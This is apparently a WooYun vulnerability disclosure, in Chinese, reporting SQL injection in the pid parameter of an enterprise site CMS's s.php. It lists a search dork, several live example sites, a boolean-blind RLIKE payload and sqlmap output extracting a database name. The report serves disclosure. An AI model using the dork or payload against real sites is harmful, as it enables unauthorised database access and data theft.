wybug_title: 某通用型企业建站系统一处SQL注入
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2015-04-07：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-05-22：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 某通用型企业建站系统一处SQL注入 详细说明：  关键词：inurl:i.php?pid= 漏洞文件：s.php参数：pid案例：http://www.yufeng111.com/s.php?classid=8&id=6&t=2&pid=5http://www.hrb-bs.com//s.php?classid=8&id=6&t=2&pid=1http://www.hljorient.com//s.php?classid=8&id=6&t=2&pid=1http://www.zlanquan.com//s.php?classid=1&id=1&t=1&pid=1http://www.yuelangzhineng.com/s.php?classid=1&id=1&t=1&pid=1   漏洞证明：  TEST：http://www.yufeng111.com/s.php?classid=8&id=6&t=2&pid=5
Place: GETParameter: pid    Type: boolean-based blind    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)    Payload: classid=8&id=6&t=2&pid=5 RLIKE IF(4322=4322,5,0x28)---[12:46:56] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5[12:46:56] [INFO] fetching database names[12:46:56] [INFO] fetching number of databases[12:46:56] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[12:46:56] [INFO] retrieved:[12:46:58] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'[12:46:58] [ERROR] unable to retrieve the number of databases[12:46:58] [INFO] falling back to current database[12:46:58] [INFO] fetching current database[12:46:58] [INFO] retrieved:[12:46:59] [WARNING] reflective value(s) found and filtering outyufeng111available databases [1]:[*] yufeng111
   修复方案：  RT   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
